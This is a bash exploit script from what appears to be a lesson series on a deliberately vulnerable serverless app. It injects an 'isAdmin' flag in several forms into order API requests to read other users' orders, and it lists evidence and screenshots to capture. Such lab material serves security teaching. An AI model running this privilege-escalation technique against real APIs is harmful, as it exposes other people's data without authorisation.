#!/bin/bash
# =============================================================================
# Lesson #5: Broken Access Control — Exploit Script
# DVSA Vulnerability: isAdmin flag read from client request body
# =============================================================================
# Usage: bash lesson05_broken_access_control.sh <API_URL> <TOKEN> <ORDER_ID>
# =============================================================================

set -euo pipefail

API_URL="${1:?Usage: $0 <API_URL> <JWT_TOKEN> <ORDER_ID>}"
TOKEN="${2:?Provide a valid JWT token}"
ORDER_ID="${3:?Provide a valid order-id}"

ORDER_ENDPOINT="${API_URL}"

echo "============================================"
echo " Lesson #5: Broken Access Control"
echo "============================================"
echo ""

# Step 1: Confirm normal behavior — user sees only their own orders
echo "[*] Step 1: Confirming normal behavior (no isAdmin flag)..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw '{"action":"orders"}' | python3 -m json.tool
echo ""

# Step 2: Attempt to pass isAdmin flag as regular user
echo "[*] Step 2: Sending isAdmin:true as a regular user..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"get\",\"order-id\":\"${ORDER_ID}\",\"isAdmin\":\"true\"}" \
  | python3 -m json.tool
echo ""

# Step 3: Try with boolean true
echo "[*] Step 3: Trying isAdmin as boolean true..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"get\",\"order-id\":\"${ORDER_ID}\",\"isAdmin\":true}" \
  | python3 -m json.tool
echo ""

# Step 4: Try with integer 1
echo "[*] Step 4: Trying isAdmin as integer 1..."
curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"get\",\"order-id\":\"${ORDER_ID}\",\"isAdmin\":1}" \
  | python3 -m json.tool
echo ""

echo "============================================"
echo " KEY EVIDENCE TO CAPTURE:"
echo " Stack trace showing:"
echo " File /var/task/get_order.py line 32"
echo " is_admin = json.loads(event.get(isAdmin, false).lower())"
echo " This proves isAdmin is read from client request body"
echo "============================================"
echo ""
echo " SCREENSHOT REMINDERS:"
echo " 1. Step 1 output — normal orders response"
echo " 2. Step 2/3/4 output — stack trace revealing vulnerable code"
echo " 3. Post-fix — same request returns 403 forbidden"
echo "============================================"
